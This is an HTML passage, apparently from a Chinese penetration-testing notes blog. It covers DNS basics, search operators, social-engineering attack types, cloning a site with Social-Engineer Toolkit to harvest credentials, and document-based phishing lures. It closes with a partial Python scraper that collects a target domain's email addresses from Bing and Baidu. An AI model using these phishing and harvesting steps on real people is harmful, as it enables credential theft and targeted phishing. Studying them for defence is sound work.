fofa、WhatWeb、w11scan、WebEye.</p>\n<h2 id=\"域名解析\"><a class=\"anchor\" href=\"#域名解析\">#</a> 域名解析</h2>\n<p>DNS 是互联网上作为域名和 ip 地址相互映射的一个分布式数据库，通过 DNS 使得用户更方便的访问互联网，而不是去记忆能够被机器读取的 IP 地址，简单来说就是将域名解析成 IP 地址</p>\n<p>域名解析的特点：IP 地址对域名是一对多的关系</p>\n<p>常见的解析类型：</p>\n<ol>\n<li>A 记录解析：有被称为 ip 指向，用户可以在此设置子域名并指向到自己的目标主机 ip 地址上，从而通过域名找到服务器 （一一对应）</li>\n<li>CNAME 记录解析：有被称为别名指向，把域名解析到另一个地址，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS10ZXN0LWY5NmczMTVnd3gyYXB1dS5teWRvbWFpbi5jb20=\">比如设置 test.mydomain.com</span>，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS13d3ctcDE4ZG9odmRzMTFjbzgzYXQ1aGVtYXc1MGsucmRkbnMueG4tLWNvbXRlc3Qtb2I0a3M5YmEzMDNsdmthdDYxZ3EyM2YyZTZkLm15ZG9tYWluLnhuLS1jb213d3ctcng4aTIyN20ybmNkM2F1MTViLnJkZG5zLmNvbQ==\">用来指向一个主机 www.rddns.com 那么以后就可以用 test.mydomain.com 来代替方法 www.rddns.com</span></li>\n<li>MX 记录解析：有被称为邮件交换记录，用于以该域名为结尾的电子邮箱指向邮件服务器，如：用户所有的邮件结尾是以域名 mydomain.com 结尾，则需要在管理界面添加该域名的 MX 记录来处理所有以 @mydomain.com 结尾的邮件</li>\n</ol>\n<h3 id=\"域名服务器\"><a class=\"anchor\" href=\"#域名服务器\">#</a> 域名服务器</h3>\n<p>根域名服务器：主要用来管理互联网的主目录，世界一个有 13 个根域名服务器，名字分别是 A 到 M</p>\n<p>顶级域名服务器：顶级域名就是在根域名的前面加上你自己定义的字母或者数字等字符</p>\n<p>二级域名服务器：当注册了一个顶级域名服务器后，列入 web.cn 就可以在互联网服务提供商的 dns 解析系统上面自由的分配二级域名或者三级域名</p>\n<p>权威名称服务器：名称服务器（DNS 服务器），用于保存特定域 / 地址的实际 DNS 记录（A,CNAME,PTR 等）。</p>\n<h2 id=\"基于搜索引擎的子域名收集\"><a class=\"anchor\" href=\"#基于搜索引擎的子域名收集\">#</a> 基于搜索引擎的子域名收集</h2>\n<ol>\n<li>Site：特定域名下进行搜索。</li>\n<li>Domain：查询自身网站的外部链接。</li>\n<li>Inurl：指令用于搜索查询词出现在 url 中的页面。</li>\n<li>Intitle：进行搜索含关键字的标题。</li>\n<li>Info：查找指定站点的一些基本信息。</li>\n<li>Filetype：只搜索某些特定类型的文件格式。</li>\n<li>Link：返回所有和 xxxxxxx 做了链接的 URLIndex：返回的网页中在正文部分包含关键词。</li>\n<li>Define：搜索某个词语的定义 And：利用 and 表示前后两个关键词是 “与” 的逻辑关系，例如 “SEO and 网络营销”，就会找出将包含 SEO 和网络营销有关的网站。</li>\n</ol>\n<h2 id=\"社工攻击概述\"><a class=\"anchor\" href=\"#社工攻击概述\">#</a> 社工攻击概述</h2>\n<p>下面是一个流程的攻击链</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303142235808.png\" alt=\"image-20230314223533399\" /></p>\n<p>社会工程攻击，是一种利用 “社会工程学” 来实施的网络攻击行为</p>\n<ol>\n<li>供应链攻击：针对各类软件，供应商，合作商等进行攻击的攻击方式</li>\n<li>水坑攻击：通过猜测观察目标的经常访问的网站，并入侵其中一个或者多个，植入恶意软件，达到感染该组目标中部分成员的目的</li>\n<li>物理攻击 - USB 摆渡：散播 USB 攻击：Autorun.inf，BadUSB，u 盘，鼠标，键盘，USB 风扇，USB 灯；</li>\n<li>物理攻击 - WIFI 攻击：内网 WIFI - 弱口令，内网 GuestWIFI，使用 wifi 钥匙一类的众筹密码产品</li>\n<li>物理攻击 - 人工渗透：伪造工牌，伪造工卡，伪造工作人员，物理开锁</li>\n<li>钓鱼邮件攻击：攻击这获取或者篡改邮件，病毒邮件，垃圾邮件，邮件炸弹等</li>\n</ol>\n<h2 id=\"邮件钓鱼攻击\"><a class=\"anchor\" href=\"#邮件钓鱼攻击\">#</a> 邮件钓鱼攻击</h2>\n<h3 id=\"伪造钓鱼网站\"><a class=\"anchor\" href=\"#伪造钓鱼网站\">#</a> 伪造钓鱼网站</h3>\n<p>做一个很像的前段，发一个链接让受害者去访问点击，获取受害者的账号密码</p>\n<p>使用 kali 的 Social-Engineer Toolkit</p>\n<p>首先选择社会工程学攻击</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303161920220.png\" alt=\"image-20230316192014118\" /></p>\n<p>接着选择 web 网站攻击</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303161920740.png\" alt=\"image-20230316192055686\" /></p>\n<p>接着选择 5</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303161921076.png\" alt=\"image-20230316192143018\" /></p>\n<p>接着选择 1，网站克隆</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303162010771.png\" alt=\"image-20230316201016728\" /></p>\n<p>下面就是 ip 和目标网站了</p>\n<h3 id=\"鱼叉攻击\"><a class=\"anchor\" href=\"#鱼叉攻击\">#</a> 鱼叉攻击</h3>\n<p>利用木马程序作为邮件的附件，发送到目标电脑上，诱导受害者去打开附件来感染木马</p>\n<p>传统宏文件制作钓鱼邮件</p>\n<h3 id=\"chm钓鱼\"><a class=\"anchor\" href=\"#chm钓鱼\">#</a> CHM 钓鱼</h3>\n<p>CHM 已编译的帮助文件，它是微软新一代的帮助文件格式，利用 HTML 作为源文，把帮助内容以类似数据库的形式编译存储</p>\n<h3 id=\"其他钓鱼方式\"><a class=\"anchor\" href=\"#其他钓鱼方式\">#</a> 其他钓鱼方式</h3>\n<ol>\n<li>OLE 钓鱼：<br />\n利用 word 中插入外部对象的方式</li>\n<li>LNK 钓鱼：<br />\nlnk 文件是用于指向其他文件的一种文件。这些文件通常被称为快捷方式</li>\n<li>HTA 钓鱼<br />\n HTA 钓鱼是 HTML Application 的缩写，直接讲 HTML 保持成 HTA 的格式，是一个独立的应用软件</li>\n<li>捆绑马</li>\n</ol>\n<h2 id=\"目标邮箱收集\"><a class=\"anchor\" href=\"#目标邮箱收集\">#</a> 目标邮箱收集</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9odW50ZXIuaW8v\">Find email addresses in seconds • Hunter (Email Hunter)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy52ZXJ5dnAuY29tLw==\">微匹 - 让每天都有新客户 (veryvp.com)</span></p>\n<p>上面两个网站都说用来收集邮箱的</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#-*- coding:utf-8 -*-</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> getopt</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">from</span> bs4 <span class=\"token keyword\">import</span> BeautifulSoup</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> re</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">import</span> threading</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#banner 信息</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">banner</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[1;34m########################################################################################\\033[0m\\n'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>          <span class=\"token string\">'\\033[1;34m######################################\\033[1;32m贝塔安全实验室\\033[1;34m#####################################\\033[0m\\n'</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>          <span class=\"token string\">'\\033[1;34m########################################################################################\\033[0m\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">#使用规则</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">usage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'-h: --help 帮助;'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'-u: --url  域名;'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'-p: --pages 页数;'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'eg: python -u \"www.baidu.com\" -p 100'</span><span class=\"token operator\">+</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    sys<span class=\"token punctuation\">.</span>exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">## 未授权函数检测</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">#主函数，传入输入参数进入</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">start</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    url <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    pages <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"-h 帮助信息;\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        sys<span class=\"token punctuation\">.</span>exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token comment\">#定义异常处理</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        banner<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        opts<span class=\"token punctuation\">,</span>args <span class=\"token operator\">=</span> getopt<span class=\"token punctuation\">.</span>getopt<span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">,</span><span class=\"token string\">\"-u:-p:-h\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">except</span> getopt<span class=\"token punctuation\">.</span>GetoptError<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Error an argument!'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        sys<span class=\"token punctuation\">.</span>exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">for</span> opt<span class=\"token punctuation\">,</span>arg <span class=\"token keyword\">in</span> opts<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token keyword\">if</span> opt <span class=\"token operator\">==</span> <span class=\"token string\">\"-u\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            url <span class=\"token operator\">=</span> arg</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token keyword\">elif</span> opt <span class=\"token operator\">==</span> <span class=\"token string\">\"-p\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            pages <span class=\"token operator\">=</span> arg</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token keyword\">elif</span> opt <span class=\"token operator\">==</span> <span class=\"token string\">\"-h\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>usage<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        threader<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> pages<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">MyThread</span><span class=\"token punctuation\">(</span>threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> func<span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token builtin\">super</span><span class=\"token punctuation\">(</span>MyThread<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>__init__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        self<span class=\"token punctuation\">.</span>func <span class=\"token operator\">=</span> func</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        self<span class=\"token punctuation\">.</span>args <span class=\"token operator\">=</span> args</pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>            <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>            self<span class=\"token punctuation\">.</span>result <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>func<span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>self<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 在执行函数的同时，把结果赋值给 result, 然后通过 get_result 函数获取返回的结果</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">get_result</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>            <span class=\"token keyword\">return</span> self<span class=\"token punctuation\">.</span>result</pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">threader</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>pages<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    launcher<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>pages<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    <span class=\"token comment\">#漏洞回调函数</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">launcher</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>pages<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>pages<span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>        <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>        <span class=\"token keyword\">for</span> page <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>pages<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>            keyword<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>page<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre></pre></td></tr><tr><td data-num=\"78\"></td><td><pre></pre></td></tr><tr><td data-num=\"79\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">keyword</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>page<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>    threads <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    email_sum <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>    email_num <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>    key_words <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'email'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'mail'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'mailbox'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'邮件'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'邮箱'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'postbox'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>    <span class=\"token keyword\">for</span> key_word <span class=\"token keyword\">in</span> key_words<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>        t <span class=\"token operator\">=</span> MyThread<span class=\"token punctuation\">(</span>emails<span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> page<span class=\"token punctuation\">,</span>key_word<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>        t<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>        threads<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>    <span class=\"token keyword\">for</span> t <span class=\"token keyword\">in</span> threads<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>        t<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 一定执行 join, 等待子进程执行结束，主进程再往下执行</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>        email_num<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">.</span>get_result<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>    <span class=\"token keyword\">for</span> email <span class=\"token keyword\">in</span> email_num<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token builtin\">list</span> <span class=\"token keyword\">in</span> email<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token builtin\">list</span> <span class=\"token keyword\">in</span> email_sum<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>                <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>                email_sum<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre></pre></td></tr><tr><td data-num=\"99\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">emails</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>page<span class=\"token punctuation\">,</span>key_word<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>    bing_emails <span class=\"token operator\">=</span> bing_search<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> page<span class=\"token punctuation\">,</span> key_word<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>    baidu_emails <span class=\"token operator\">=</span> baidu_search<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> page<span class=\"token punctuation\">,</span> key_word<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>    sum_emails <span class=\"token operator\">=</span> bing_emails <span class=\"token operator\">+</span> baidu_emails</pre></td></tr><tr><td data-num=\"103\"></td><td><pre>    <span class=\"token keyword\">return</span> sum_emails</pre></td></tr><tr><td data-num=\"104\"></td><td><pre></pre></td></tr><tr><td data-num=\"105\"></td><td><pre></pre></td></tr><tr><td data-num=\"106\"></td><td><pre></pre></td></tr><tr><td data-num=\"107\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">bing_search</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>page<span class=\"token punctuation\">,</span>key_word<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>    referer <span class=\"token operator\">=</span> <span class=\"token string\">\"http://cn.bing.com/search?q=email+site%3abaidu.com&amp;qs=n&amp;sp=-1&amp;pq=emailsite%3abaidu.com&amp;first=1&amp;FORM=PERE1\"</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>    conn <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>    bing_url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://cn.bing.com/search?q=\"</span> <span class=\"token operator\">+</span> key_word <span class=\"token operator\">+</span> <span class=\"token string\">\"+site%3a\"</span> <span class=\"token operator\">+</span> url <span class=\"token operator\">+</span> <span class=\"token string\">\"&amp;qs=n&amp;sp=-1&amp;pq=\"</span> <span class=\"token operator\">+</span> key_word <span class=\"token operator\">+</span> <span class=\"token string\">\"site%3a\"</span> <span class=\"token operator\">+</span> url <span class=\"token operator\">+</span> <span class=\"token string\">\"&amp;first=\"</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>        <span class=\"token punctuation\">(</span>page<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"&amp;FORM=PERE1\"</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>    conn<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'http://cn.bing.com'</span><span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>headers<span class=\"token punctuation\">(</span>referer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>    r <span class=\"token operator\">=</span> conn<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>bing_url<span class=\"token punctuation\">,</span> stream<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>headers<span class=\"token punctuation\">(</span>referer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> timeout<span class=\"token operator\">=</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>    emails <span class=\"token operator\">=</span> search_email<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>    <span class=\"token keyword\">return</span> emails</pre></td></tr><tr><td data-num=\"116\"></td><td><pre></pre></td></tr><tr><td data-num=\"117\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">baidu_search</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>page<span class=\"token punctuation\">,</span>key_word<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>    email_list <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>    emails <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>    referer <span class=\"token operator\">=</span> <span class=\"token string\">\"https://www.baidu.com/s?wd=email+site%3Abaidu.com&amp;pn=1\"</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>    baidu_url <span class=\"token operator\">=</span> <span class=\"token string\">\"https://www.baidu.com/s?wd=\"</span><span class=\"token operator\">+</span>key_word<span class=\"token operator\">+</span><span class=\"token string\">\"+site%3A\"</span><span class=\"token operator\">+</span>url<span class=\"token operator\">+</span><span class=\"token string\">\"&amp;pn=\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>page<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>    conn <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>    conn<span class=\"token punctuation\">.</span>get<span class=\"token 